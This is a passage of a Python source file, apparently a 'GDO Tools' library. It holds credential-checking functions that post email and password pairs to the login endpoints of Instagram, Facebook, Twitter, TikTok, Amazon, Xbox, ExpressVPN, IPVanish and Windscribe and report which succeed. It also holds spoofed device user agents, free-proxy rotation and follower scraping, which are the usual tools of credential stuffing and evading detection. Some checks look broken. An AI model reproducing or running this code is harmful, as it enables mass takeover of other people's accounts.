                      'resolution': '1440x2392', 'manufacturer': 'LGE/lge', 'device': 'RS988', 'model': 'h1',
                      'cpu': 'h1', 'version_code': virs},
            'zte_axon_7': {'app_version': vers, 'android_version': '23', 'android_release': '6.0.1', 'dpi': '640dpi',
                           'resolution': '1440x2560', 'manufacturer': 'ZTE', 'device': 'ZTE A2017U',
                           'model': 'ailsa_ii', 'cpu': 'qcom', 'version_code': virs},
            'samsung_galaxy_s7_edge': {'app_version': vers, 'android_version': '23', 'android_release': '6.0.1',
                                       'dpi': '640dpi', 'resolution': '1440x2560', 'manufacturer': 'samsung',
                                       'device': 'SM-G935', 'model': 'hero2lte', 'cpu': 'samsungexynos8890',
                                       'version_code': virs}, }
        davic = random.choice(list(de.keys()))
        versions = de[davic]['app_version']
        androids = de[davic]['android_version']
        endroids = de[davic]['android_release']
        phonas = de[davic]['dpi']
        phones = de[davic]['resolution']
        manufa = de[davic]['manufacturer']
        devicees = de[davic]['device']
        modelas = de[davic]['model']
        apicup = de[davic]['cpu']
        versiones = de[davic]['version_code']
        massage = 'Instagram {} Android ({}/{}; {}; {}; {}; {}; {}; {}; en_US; {})'.format(str(versions), str(androids),
                                                                                           str(endroids), str(phonas),
                                                                                           str(phones), str(manufa),
                                                                                           str(devicees), str(modelas),
                                                                                           str(apicup), str(versiones))
        return massage

    def get_users_following(username: str, password: str, name: str) -> str:
        s = instaloader.Instaloader()
        try:
            s.login(username, password)
            profile = instaloader.Profile.from_username(s.context, name)
            follow_list = []
            for follow in profile.get_followees():
                user = str(follow)
                uu = user.split('Profile ')[1]
                users = uu.split('(')[0]
                follow_list.append(users)

            return follow_list

        except:
            return {'status': 'error', 'login': 'error'}

    def get_users_followers(username: str, password: str, name: str) -> str:
        s = instaloader.Instaloader()
        try:
            s.login(username, password)
            profile = instaloader.Profile.from_username(s.context, name)
            follow_list = []
            for follow in profile.get_followers():
                user = str(follow)
                uu = user.split('Profile ')[1]
                users = uu.split('(')[0]
                follow_list.append(users)

            return follow_list

        except:
            return {'status': 'error', 'login': 'error'}

    def get_ids_following(username: str, password: str, name: str) -> str:
        L = instaloader.Instaloader()
        try:
            L.login(username, password)
            profile = instaloader.Profile.from_username(L.context, name)
            follow_list = []
            for follow in profile.get_followees():
                user = str(follow)
                idd = user.split('(')[1]
                id = idd.split(')')[0]
                follow_list.append(id)

            return follow_list

        except:
            return {'status': 'error', 'login': 'error'}

    def get_ids_followers(username: str, password: str, name: str) -> str:
        L = instaloader.Instaloader()
        try:
            L.login(username, password)
            profile = instaloader.Profile.from_username(L.context, name)
            follow_list = []
            for follow in profile.get_followers():
                user = str(follow)
                idd = user.split('(')[1]
                id = idd.split(')')[0]
                follow_list.append(id)

            return follow_list

        except:
            return {'status': 'error', 'login': 'error'}

    def get_email():
        s = ["@gmail.com", "@yahoo.com", "@hotmail.com", "@aol.com", "@outlook.com"]
        domin = random.choice(s)
        url = 'https://randommer.io/random-email-address'
        headers = {
            'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
            'content-length': '239',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'cookie': '.AspNetCore.Antiforgery.9TtSrW0hzOs=CfDJ8DJ-g9FHSSxClzJ5QJouzeI7-q_vZxCnhkeFlGapcHZgJbZ-aP87NSgO15EqlMTNlpWsrTtDK8Qo_FkcelUen-XMHT8ZaUCFeGiAhGS8O7Ny-7XLvjZQza8gyEX141ln397mg-FwkxUmh8CBjHv4QKw',
            'origin': 'https://randommer.io',
            'sec-ch-ua': '"Not A;Brand";v="99", "Chromium";v="98"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': str(generate_user_agent()),
            'x-requested-with': 'XMLHttpRequest'}

        data = {
            'number': "1",
            'culture': 'en_US',
            '__RequestVerificationToken': 'CfDJ8DJ-g9FHSSxClzJ5QJouzeLi6tSHIeSyq6LHD-lqesWRBHZhI32LFnxMH163TgAQwwE7dRIDYclgxYfDODEZgqrDwuegjkOko7L88MqV4BLhOsmSdGm9gFbDalgtuV6lb3bhat9gHttOROyeP72M4aw',
            'X-Requested-With': 'XMLHttpRequest'}
        req = requests.post(url, headers=headers, data=data).text
        data = req.replace('[', '').replace(']', '').split(',')
        for i in data:
            eail = i.replace('"', '')
            ema = eail.split("@")[0]
            email = ema + domin
            return email

    def get_proxy():
        pro = requests.get('https://gimmeproxy.com/api/getProxy')
        if '"protocol"' in pro.text or '"ip"' in pro.text or '"port"' in pro.text:
            if str(pro.json()['protocol']) == 'socks5':
                proxy = str(pro.json()['curl'])
                return {'proxy': proxy, 'status': True}
            else:
                return {'message': 'Bad proxy', 'status': 'error'}
        else:
            return {'message': 'Bad Protocol', 'status': 'error'}

    def get_user_agent():
        message = str(generate_user_agent())
        return message

    def csrf_token():
        try:
            headers = {"User-Agent": str(generate_user_agent())}
            with requests.Session() as azoz:
                url_tok = "https://www.instagram.com/"
                data = azoz.get(url_tok, headers=headers).content
                token = re.findall('{"config":{"csrf_token":"(.*)","viewer"', str(data))[0]
                return {'csrf_token': str(token)}

        except:
            return {'status': 'error'}

    def id_post(url: str) -> str:
        url = str(url)
        igshid = url.split("?")[1].split("%")[0]
        data = {"igshid": igshid, }
        res = requests.get(url, data=data).text
        idd = res.split('content="instagram://media?id=')[1]
        id = idd.split('"/>')[0]
        return id

    def get_info_ip(ip: str) -> str:
        url = "https://ipinfo.io/widget/demo/" + ip
        headers = {
            'Host': 'ipinfo.io',
            'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="96", "Google Chrome";v="96"',
            'sec-ch-ua-mobile': '?1',
            'save-data': 'on',
            'user-agent': str(generate_user_agent()),
            'sec-ch-ua-platform': '"Android"',
            'content-type': 'application/json',
            'accept': '*/*',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-mode': 'cors',
            'sec-fetch-dest': 'empty',
            'referer': 'https://ipinfo.io/',
            'accept-encoding': 'gzip, deflate, br',
            'accept-language': 'ar-AE,ar;q=0.9,en-US;q=0.8,en;q=0.7',
            'cookie': 'flash=',
            'cookie': 'bento_visitor_id=d0224ad9-b83a-4103-a8e6-aa794b0fc1da',
            'cookie': 'bento_visit_id=b70e5bfe-8341-43e5-a46c-84a3c14cf2e5',
            'cookie': 'bento_events=%5B%7B%22id%22%3A%22a1203021-2f6a-4d31-b42d-06718983bd77%22%2C%22site%22%3A%220d66e7448ad29ad69828d1d4201299a2%22%2C%22visitor%22%3A%22d0224ad9-b83a-4103-a8e6-aa794b0fc1da%22%2C%22visit%22%3A%22b70e5bfe-8341-43e5-a46c-84a3c14cf2e5%22%2C%22type%22%3A%22%24view%22%2C%22date%22%3A%22Wed%2C%2022%20Jun%202022%2015%3A46%3A15%20GMT%22%2C%22browser%22%3A%7B%22user_agent%22%3A%22Mozilla/5.0%20%28Linux%3B%20Android%208.0.0%3B%20SM-G930V%29%20AppleWebKit/537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome/96.0.4664.92%20Mobile%20Safari/537.36%22%7D%2C%22page%22%3A%7B%22url%22%3A%22https%3A//ipinfo.io/%22%2C%22queryString%22%3A%22%22%2C%22anchor%22%3A%22%22%2C%22host%22%3A%22ipinfo.io%22%2C%22path%22%3A%22/%22%2C%22protocol%22%3A%22https%3A%22%2C%22title%22%3A%22Comprehensive%20IP%20address%20data%2C%20IP%20geolocation%20API%20and%20database%20-%20IPinfo.io%22%2C%22referrer%22%3A%22%22%7D%2C%22identity%22%3A%7B%7D%7D%5D', }
        res = json.loads(requests.get(url, headers=headers).text)
        try:
            try:
                ip = res["data"]["ip"]
            except KeyError:
                ip = False
            try:
                name = res["data"]["name"]
            except KeyError:
                name = False
            try:
                city = res["data"]["city"]
            except KeyError:
                city = False
            try:
                country = res["data"]["country"]
            except KeyError:
                country = False
            try:
                isp = res["data"]["region"]
            except KeyError:
                isp = False
            try:
                region = res["data"]["org"]
            except KeyError:
                region = False
            try:
                timezone = res["data"]["timezone"]
            except KeyError:
                timezone = False
            try:
                postal = res["data"]["postal"]
            except KeyError:
                postal = False
            try:
                asn = res["data"]["asn"]["asn"]
            except KeyError:
                asn = False
            try:
                asn_name = res["data"]["asn"]["name"]
            except KeyError:
                asn_name = False
            try:
                domain = res["data"]["asn"]["domain"]
            except KeyError:
                domain = False
            try:
                route = res["data"]["asn"]["route"]
            except KeyError:
                route = False
            try:
                company_name = res["data"]["company"]["name"]
            except KeyError:
                company_name = False
            try:
                vpn = res["data"]["privacy"]["vpn"]
            except KeyError:
                vpn = False
            try:
                proxy = res["data"]["privacy"]["proxy"]
            except KeyError:
                proxy = False
            try:
                service = res["data"]["privacy"]["service"]
            except KeyError:
                service = False
            try:
                hosting = res["data"]["privacy"]["hosting"]
            except KeyError:
                hosting = False
            try:
                address = res["data"]["abuse"]["address"]
            except KeyError:
                address = False
            try:
                email = res["data"]["abuse"]["email"]
            except KeyError:
                email = False
            try:
                phone = res["data"]["abuse"]["phone"]
            except KeyError:
                phone = False

            message = {}
            message["ip"] = ip
            message["name"] = name
            message["city"] = city
            message["country"] = country
            message["isp"] = isp
            message["region"] = region
            message["timezone"] = timezone
            message["postal"] = postal
            message["asn"] = asn
            message["asn_name"] = asn_name
            message["domain"] = domain
            message["route"] = route
            message["company_name"] = company_name
            message["vpn"] = vpn
            message["proxy"] = proxy
            message["service"] = service
            message["hosting"] = hosting
            message["address"] = address
            message["email"] = email
            message["phone"] = phone

            return message
        except:
            return False


# -------------------------[CoDe BY GDØ]------------------------
# -------------------------[CoDe BY GDØ]------------------------
# -------------------------[CoDe BY GDØ]------------------------

class login_IG:

    def __init__(self, username, password):
        self.username = username
        self.password = password
        md = hashlib.md5()
        md.update(username.encode('utf-8') + password.encode('utf-8'))
        self.device_id = self.tsn(md.hexdigest())
        self.uuid = self.Tsne(True)
        self.se = requests.Session()

    def tsn(self, sed):
        volatile_ = "12345"
        md = hashlib.md5()
        md.update(sed.encode('utf-8') + volatile_.encode('utf-8'))
        return 'android-' + md.hexdigest()[:16]

    def Tsne(self, type):
        uuid_ = str(uuid.uuid4())
        if (type):
            return uuid_
        else:
            return uuid_.replace('-', '')

    def instagram(self):
        self.url = "https://i.instagram.com/api/v1/accounts/login/"
        token = self.se.get("https://www.instagram.com/", headers={"user-agent": str(generate_user_agent())}).text
        crftoken = re.findall(r"\"csrf_token\"\:\"(.*?)\"", str(token))[0]
        self.se.headers.update({
            'Connection': 'close',
            'Accept': '*/*',
            'Content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'Cookie2': '$Version=1',
            'Accept-Language': 'en-US',
            'User-Agent': str(gdo_drow.Server_IG())})
        self.data = json.dumps({
            'phone_id': self.Tsne(True),
            '_csrftoken': crftoken,
            'username': self.username,
            'guid': self.uuid,
            'device_id': self.device_id,
            'password': self.password,
            'login_attempt_count': '0'})
        self.payload = 'signed_body={}.{}&ig_sig_key_version=4'.format(self.Tsne(False),
                                                                       urllib.request.quote(self.data))
        resp = self.se.post(self.url, self.payload)
        res = json.loads(resp.text)
        cookie = resp.cookies.get_dict()
        if ("logged_in_user") in str(resp.text):
            cookies = ";".join([v + "=" + cookie[v] for v in cookie])
            sessionid = str(self.se.cookies['sessionid'])
            userid = str(res['logged_in_user']['pk'])
            url = f"https://i.instagram.com/api/v1/users/{userid}/info/"
            headers = {
                "accept": "*/*",
                "accept-encoding": "gzip, deflate, br",
                "accept-language": "ar,en-US;q=0.9,en;q=0.8",
                "cookie": "mid=YF55GAALAAF55lDR3NkHNG4S-vjw; ig_did=F3A1F3B5-01DB-457B-A6FA-6F83AD1717DE; ig_nrcb=1; shbid=13126; shbts=1616804137.1316793; rur=PRN; ig_direct_region_hint=ATN; csrftoken=ot7HDQ6ZX2EPbVQe1P9Nqvm1WmMkzKn2; ds_user_id=46165248972; sessionid=" + str(
                    sessionid),
                "origin": "https://www.instagram.com",
                "referer": "https://www.instagram.com/",
                "user-agent": gdo_drow.Server_IG(),
                "x-ig-app-id": "936619743392459",
                "x-ig-www-claim": "hmac.AR0EWvjix_XsqAIjAt7fjL3qLwQKCRTB8UMXTGL5j7pkgbG4", }
            respo = requests.Session().get(url, data=False, headers=headers).json()
            username = str(respo["user"]["username"])
            followers = str(respo["user"]["follower_count"])
            following = str(respo["user"]["following_count"])
            massage = {
                'status': 'Success',
                'userid': str(userid),
                'username': str(username),
                'followers': str(followers),
                'following': str(following),
                'sessionid': str(sessionid),
                'cookies': str(cookies)}
            return massage

        elif ('challenge_required') in str(res):
            return {'status': 'Checkpoint'}

        else:
            return {'status': 'error'}


# -------------------------[CoDe BY GDØ]------------------------
# -------------------------[CoDe BY GDØ]------------------------
# -------------------------[CoDe BY GDØ]------------------------

class login:

    def facebook(email: str, password: str) -> str:
        url = "https://b-graph.facebook.com/auth/login"
        headers = {
            "authorization": "OAuth 200424423651082|2a9918c6bcd75b94cefcbb5635c6ad16",
            "user-agent": "Dalvik/2.1.0 (Linux; U; Android 10; BLA-L29 Build/HUAWEIBLA-L29S) [FBAN/MessengerLite;FBAV/305.0.0.7.106;FBPN/com.facebook.mlite;FBLC/ar_PS;FBBV/372376702;FBCR/Ooredoo;FBMF/HUAWEI;FBBD/HUAWEI;FBDV/BLA-L29;FBSV/10;FBCA/arm64-v8a:null;FBDM/{density=3.0,width=1080,height=2040};]"}
        data = f"email={email}&password={password}&credentials_type=password&error_detail_type=button_with_disabled&format=json&device_id={uuid.uuid4()}&generate_session_cookies=1&generate_analytics_claim=1&generate_machine_id=1&method=POST"
        res = requests.post(url, data=data, headers=headers, verify=False, timeout=15).json()
        if list(res)[0] == "session_key":
            message = {
                'status': 'Success',
                'secret': str(res["secret"]),
                'id': str(res["uid"]),
                'access_token': str(res["access_token"])}
        else:
            try:
                message = {
                    'status': 'error',
                    'message': str(res["error"]["error_user_title"])}
                return message
            except:
                return {'status': 'error'}

    def twiter(user: str, password: str) -> str:
        url = 'https://twitter.com/sessions'
        headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': 'ar,en-US;q=0.7,en;q=0.3',
            'Content-Length': '901',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Host': 'twitter.com',
            'Origin': 'https://twitter.com',
            'Referer': 'https://twitter.com/login?lang=ar',
            'TE': 'Trailers',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': str(generate_user_agent()), }
        data = {
            'redirect_after_login': '/',
            'remember_me': '1',
            'authenticity_token': '10908ac0975311eb868c135992f7d397',
            'wfa': '1',
            'ui_metrics': '{\"rf\":{\"ab4c9cdc2d5d097a5b2ccee53072aff6d2b5b13f71cef1a233ff378523d85df3\":1,\"a51091a0c1e2864360d289e822acd0aa011b3c4cabba8a9bb010341e5f31c2d2\":84,\"a8d0bb821f997487272cd2b3121307ff1e2e13576a153c3ba61aab86c3064650\":-1,\"aecae417e3f9939c1163cbe2bde001c0484c0aa326b8aa3d2143e3a5038a00f9\":84},\"s\":\"MwhiG0C4XblDIuWnq4rc5-Ua8dvIM0Z5pOdEjuEZhWsl90uNoC_UbskKKH7nds_Qdv8yCm9Np0hTMJEaLH8ngeOQc5G9TA0q__LH7_UyHq8ZpV2ZyoY7FLtB-1-Vcv6gKo40yLb4XslpzJwMsnkzFlB8YYFRhf6crKeuqMC-86h3xytWcTuX9Hvk7f5xBWleKfUBkUTzQTwfq4PFpzm2CCyVNWfs-dmsED7ofFV6fRZjsYoqYbvPn7XhWO1Ixf11Xn5njCWtMZOoOExZNkU-9CGJjW_ywDxzs6Q-VZdXGqqS7cjOzD5TdDhAbzCWScfhqXpFQKmWnxbdNEgQ871dhAAAAXiqazyE\"}',
            'session[username_or_email]': str(user),
            'session[password]': str(password)}
        try:
            req = requests.post(url, headers=headers, data=data)
            if ("ct0") in req.cookies:
                message = {
                    'status': 'Success',
                    'user_or_email': str(user),
                    'password': str(password)}
                return message
            else:
                return {'status': 'error'}

        except requests.exceptions.ConnectionError:
            return False

        except KeyboardInterrupt:
            return False

    def express(email: str, password: str) -> str:
        url = "https://www.expressvpn.com/sessions"
        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'accept-encoding': 'gzip, deflate, br',
            'accept-language': 'en-GB,en;q=0.9,en-US;q=0.8',
            'cache-control': 'max-age=0',
            'content-length': '230',
            'content-type': 'application/x-www-form-urlencoded',
            'cookie': 'xvid=EG-to2YQ4i8JNF4aOKfmzKoVEq_zYc4fa4PkC1scPp4%3D; xvsrcdirect=1; xv_ab=%7B%22be4803_202203_braintree_paypal%22%3A%22be4803_202203_control%22%2C%22webco392_202203_billing_info_winner%22%3A%22webco392_202203_billing_info_variant%22%7D; xvgtm=%7B%22location%22%3A%22EG%22%2C%22logged_in%22%3Afalse%2C%22report_aid_to_ga%22%3Afalse%7D; landing_page=https://www.expressvpn.net/order; _gcl_au=1.1.272875252.1650364637; _clck=waj5qh|1|f0r|0; _gid=GA1.2.1325101230.1650364657; SnapABugRef=https%3A%2F%2Fwww.expressvpn.net%2Forder%20; SnapABugHistory=1#; forterToken=8d15223a3a1e44638004714a9704f258_1650364657385__UDF43_13ck; _fbp=fb.1.1650364658200.1265141463; xvsrcwebsite=www.expressvpn.net; locale=; _gat_UA-8164236-1=1; _xv_web_frontend_session=N0FhSkVLc1dCbEQ2clpjOG9DVEhpM3VWWFJDZW5kcWNKWFQvcVlQK1VISnNvZVZ3T2ZiamtReFJzYnNsbHZOOVVEZWhrSVBaeFpLOVJEeUk1cXNNZlNBRVhSTlNJMEl2b3ZqbmhYMkRqWm5ZMHhtZktrUlhKKzViZ0xSN3Y1dWVOYnRLdWh5R1JJbnpmMis0akQzVUNtWEd3ZXpFaldjUjRON24zUlZSa01RcFJ1VXg1TUhSc2RUWU1renFFQTQrU1lyODV1S0FETDVuNFJNY0NNUWkrbmJ4bnE4WVU0Vk9iSDhLSit0VjNuMit1c3R5T1lwRkFLMmwrUDlPaUxTNC0tRC9IT0ZsdUtET3l6RmNYZytCTVpOZz09--6dee6293e618e7d7fdaa2e416be6e309561e5bed; _ga_ZDM0C7DHZZ=GS1.1.1650364636.1.1.1650364680.16; SnapABugUserAlias=%23; SnapABugVisit=3#1650364658; _ga=GA1.1.1704802388.1650364637; _uetsid=bb1bd490bfcc11ecbf747b496145ae3e; _uetvid=bb1c0730bfcc11ecb901417b6b179450; _clsk=asx9jg|1650364682051|3|1|e.clarity.ms/collect',
            'dnt': '1',
            'origin': 'https://www.expressvpn.net',
            'referer': 'https://www.expressvpn.net/sign-in',
            'sec-ch-ua': '"Not A;Brand";v="99", "Chromium";v="100", "Microsoft Edge";v="100"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': str(generate_user_agent()), }
        data = {
            'utf-8': '✓',
            'authenticity_token': 'SgVUhccIQKFh/FlqFfTTUErtcAq9oG5hJgX5InEE7eg+Ep9reGOkiRIsvDyo+2tTphNLWW6PdGnsp248zVPMkA==',
            'location_fragment': '',
            'redirect_path': '',
            'email': str(email),
            'password': str(password),
            'commit': 'Sign In', }
        req = requests.post(url, headers=headers, data=data).text
        if ("Verification Needed") in req:
            return {'status': 'error'}
        else:
            message = {
                'status': 'Success',
                'user_or_email': str(email),
                'password': str(password)}
            return message

    def tiktok(email: str, password: str) -> str:
        url = 'https://api2.musical.ly/passport/user/login/?mix_mode=1&username=1&email=&mobile=&account=&password=hg&captcha=&ts=&app_type=normal&app_language=en&manifest_version_code=2018073102&_rticket=1633593458298&iid=7011916372695598854&channel=googleplay&language=en&fp=&device_type=SM-G955F&resolution=1440*2792&openudid=91cac57ba8ef12b6&update_version_code=2018073102&sys_region=AS&os_api=28&is_my_cn=0&timezone_name=Asia/Muscat&dpi=560&carrier_region=OM&ac=wifi&device_id=6785177577851504133&mcc_mnc=42203&timezone_offset=14400&os_version=9&version_code=800&carrier_region_v2=422&app_name=musical_ly&version_name=8.0.0&device_brand=samsung&ssmix=a&build_number=8.0.0&device_platform=android&region=US&aid=&as=&cp=Qm&mas='
        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9,ar;q=0.8',
            'cookie': 'csrftoken={secrets.token_hex(8)*2}; sessionid={secrets.token_hex(8)*2};',
            'User-Agent': 'Connectionzucom.zhiliaoapp.musically/2018073102 (Linux; U; Android 9; en_AS; SM-G955F; Build/PPR1.180610.011; Cronet/58.0.2991.0)z',
            'Host': 'api2.musical.ly', 'Connection': 'keep-alive'}
        data = {"email": email, "password": password}
        res = requests.post(url, data=data, headers=headers).text
        if ("user_id") in res:
            message = {
                'status': 'Success',
                'email': str(email),
                'password': str(password), }
            return message
        else:
            return {'status': 'error'}

    def amazon(email: str, password: str) -> str:
        url = "https://www.amazon.com/ap/register%3Fopenid.assoc_handle%3Dsmallparts_amazon%26openid.identity%3Dhttp%253A%252F%252Fspecs.openid.net%252Fauth%252F2.0%252Fidentifier_select%26openid.ns%3Dhttp%253A%252F%252Fspecs.openid.net%252Fauth%252F2.0%26openid.claimed_id%3Dhttp%253A%252F%252Fspecs.openid.net%252Fauth%252F2.0%252Fidentifier_select%26openid.return_to%3Dhttps%253A%252F%252Fwww.smallparts.com%252Fsignin%26marketPlaceId%3DA2YBZOQLHY23UT%26clientContext%3D187-1331220-8510307%26pageId%3Dauthportal_register%26openid.mode%3Dcheckid_setup%26siteState%3DfinalReturnToUrl%253Dhttps%25253A%25252F%25252Fwww.smallparts.com%25252Fcontactus%25252F187-1331220-8510307%25253FappAction%25253DContactUsLanding%252526pf_rd_m%25253DA2LPUKX2E7NPQV%252526appActionToken%25253DlptkeUQfbhoOU3v4ShyMQLid53Yj3D%252526ie%25253DUTF8%252Cregist%253Dtrue"
        headers = {'User-agent': str(generate_user_agent())}
        se = requests.session()
        data = {'customerName': 'GDO Tools', 'email': str(email), 'password': str(password),
                'passwordCheck': str(password)}
        res = se.post(url, headers=headers, data=data).text
        if "You indicated you are a new customer, but an account already exists with the e-mail" in res:
            return {'status': 'error'}
        else:
            message = {
                'status': 'Success',
                'user_or_email': str(email),
                'password': str(password)}
            return message

    def xbox(email: str, password: str) -> str:
        url = f"https://login.live.com/ppsecure/post.srf?wa=wsignin1.0&rpsnv=13&rver=7.1.6819.0&wp=MBI_SSL&wreply=https:%2f%2faccount.xbox.com%2fen-us%2faccountcreation%3freturnUrl%3dhttps:%252f%252fwww.xbox.com:443%252fen-US%252f%26ru%3dhttps:%252f%252fwww.xbox.com%252fen-US%252f%26rtc%3d1&lc=1033&id=292543&aadredir=1&contextid=C61E086B741A7BC9&bk=1573475927&uaid=e94a49f177664960a3fca122edaf8a27&pid=0"
        headers = {
            'User-Agent': str(generate_user_agent()),
            'Pragma': 'no-cache',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Upgrade-Insecure-Requests': '1',
            'Referer': 'https://login.live.com/login.srf?wa=wsignin1.0&rpsnv=13&rver=7.1.6819.0&wp=MBI_SSL&wreply=https:%2f%2faccount.xbox.com%2fen-us%2faccountcreation%3freturnUrl%3dhttps:%252f%252fwww.xbox.com:443%252fen-US%252f%26ru%3dhttps:%252f%252fwww.xbox.com%252fen-US%252f%26rtc%3d1&lc=1033&id=292543&aadredir=1',
            'Cookie': 'wlidperf=FR=L&ST=1573475967016; MSPShared=1; SDIDC=CavoGthu*pkJAN8Eek6dWr5opN5x1BL2!mueAsRqcHLVS94TF9fJG7M1fnoFg6a*recSzMqgr*rslJH2ICxiqJGNoOHcIMFXc!RLunwBMWhU0x321UT4GCRmUx6DZ7AjzurT*F2lfakG55iffb2VLqMt0mhzOabJGnTjvNhmJC9g1p*grJ8oN9vhRFP1QX!nZ!fWcW27*aTbPPnlAGv9aKLWqL*MazqS52WCQ1qeFZq2cv5ZfnxVwVkgfgjdQvs2GEwfHcnTOQx1uQdtaK9OZwguM8Ck!XoiweJLLeKfFhKRZuntwAkM7ZR0uwP6Z19dR7mBTpGpy5F6!dyrkpKizd9!nzZSFFo*7poLWKhu1rNfXZj1IGgaH9sTsatt8!OJcUye6DGBEO2UgVGMYZSXh3qZLLQfoCt27U2AyIJI2kF!CwX2SD8t9RLWxmz1S3NIVWmBO8wm!DlUH1lpURHmiXbk1m!22SzIKy09LvlGae8GFkF!Rx57Ef2CKW5i5QTBtQ$$; IgnoreCAW=1; MSCC=1571654982; mkt=en-US; optimizelyEndUserId=oeu1572238927711r0.5850160263416339; uaid=e94a49f177664960a3fca122edaf8a27; MSPRequ=id=292543&lt=1573475927&co=1; OParams=113FQHpqfm3sRtenXK56hoKAENCNHVun4W*MjJ03B0XHPylHxLr2YAXrzYNH!J96HFWgoWGEdSPWFdPiET54l8VSW7HH0FPuC0Ce2pxC2uyWUloRhCunIwMUB8QUtvNr0as9T1RluKxlaF5K4LNi7CWjITDPFW2tzU!gS5LVvUdG58wfPg1itYuqY2HKQNrXN51!s!LMD8g2Gf5pcrXZibicJLoN1z5P3XSQm2UhakTdBNoDEruwv8MWbzT!5ImiwMzPP*G5APiiLE!9EKUwPT49z1!ERSbMlpzjFZP25j3o01h!9VuAllBJeaaJeclbcH9QuCwvUd2N3Z6kCiV5jlEKbyfAbHAiIJ6TNAmwU3ftHK08Fy5L6vUHSZRyocbR18FVCoP7lMVfmfQfS41VEmD3JdZTwjJIosaE7!i7E31jx5gwDqYZpo0wjnRzQlt3I9twovyRxbRxuvMVRqN7ey0AE7XI67w70kjUoRg*NbmI2BAxmuNnAdujjs4YlLsdZ8iIIFk73CkQpQ6X!MO58xB09KYImQyevehtDlrXkr*oDQCAh; MSPOK=$uuid-6b855d49-8f09-4e83-8526-b756788bf3b9$uuid-02a3151d-ba2d-4c6c-be88-c9c804ecb043', }
        data = {
            f"i13=0&login={email}&loginfmt={email}&type=11&LoginOptions=3&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd={password}&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT=DZshWk88CvvuA9vSOHldJLurwIJH4a7uUREfu4fGCsbB2nL*YUw36i0Lz7tZDGptQxZhUTW0%21*ZM3oIUxGKEeEa1gcx%21XzBNiXpzf*U9iH68RaP3u20G0J6k2%21UdeMFc9C9uusE3IwI3gi4u7wJzyq8FCiNuk2Hly66dMuX96mSwHTYXgtZZpS%21rbS35jrsdC%21Ku4UysydsP0MXSz2klYp9KU%21hDHeKBZIu13h%21rQk9jG2vzCW4OerTedipQDJRuAg%24%24&PPSX=Passpor&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=0&i2=1&i17=0&i18=&i19=32099"}
        req = requests.post(url, headers=headers, data=data)
        if ("https://account.live.com/profile/accrue?mkt=") in req.cookies:
            message = {
                'status': 'Success',
                'email': str(email),
                'password': str(password), }
            return message
        else:
            return {'status': 'error'}

    def ipvanish(email: str, password: str) -> str:
        url = "https://api.ipvanish.com/api/v3/login"
        data = {
            'api_key': '15cb936e6d19cd7db1d6f94b96017541',
            'client': 'Android-3.4.6.7.98607b98607',
            'os': '25',
            'password': {password},
            'username': {email},
            'uuid': str(uuid.uuid4())}
        headers = {
            'User-Agent': 'Android/ipvanish/1.2.',
            'X-Client': 'ipvanish',
            'X-Client-Version': '1.2.',
            'X-Platform': 'Android',
            'X-Platform-Version': '25',
            'Content-Type': 'application/json; charset=utf-8',
            'Host': 'api.ipvanish.com',
            'Connection': 'Keep-Alive',
            'Accept-Encoding': 'gzip, deflate',
            'Content-Length': '197', }
        req = requests.post(url, headers=headers, data=data)
        if ("email") in req.cookies:
            message = {
                'status': 'Success',
                'email': str(email),
                'password': str(password), }
            return message
        else:
            return {'status': 'error'}

    def windscribe(email: str, password: str) -> str:
        url = "https://windscribe.com/login"
        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'accept-encoding': 'gzip, deflate, br',
            'accept-language': 'en-GB,en;q=0.9,en-US;q=0.8',
            'cache-control': 'max-age=0',
            'content-length': '145',
            'content-type': 'application/x-www-form-urlencoded',
            'cookie': '_pk_id.3.2e1e=bc1601c2c6719d2d.1651667765.1.1651667765.1651667765.; _pk_ses.3.2e1e=*; i_can_has_cookie=1',
            'dnt': '1',
            'origin': 'https://windscribe.com',
            'referer': 'https://windscribe.com/login',
            'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="101", "Microsoft Edge";v="101"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': str(generate_user_agent()), }
        data = {
            'login': '1',
            'upgrade': '0',
            'csrf_time': '1651667761',
            'csrf_token': str(secrets.token_hex(8) * 2),
            'username': str(email),
            'password': str(password),
            'code': '', }
        req = requests.post(url, headers=headers, data=data)
        if ("myaccountpage") in req.text:
            message = {
                'status': 'Success',
                'email': str(email),
                'password': str(password), }
            return message
        else:
            return {'status': 'error'}

    def discord(email: str, password: str) -> str:
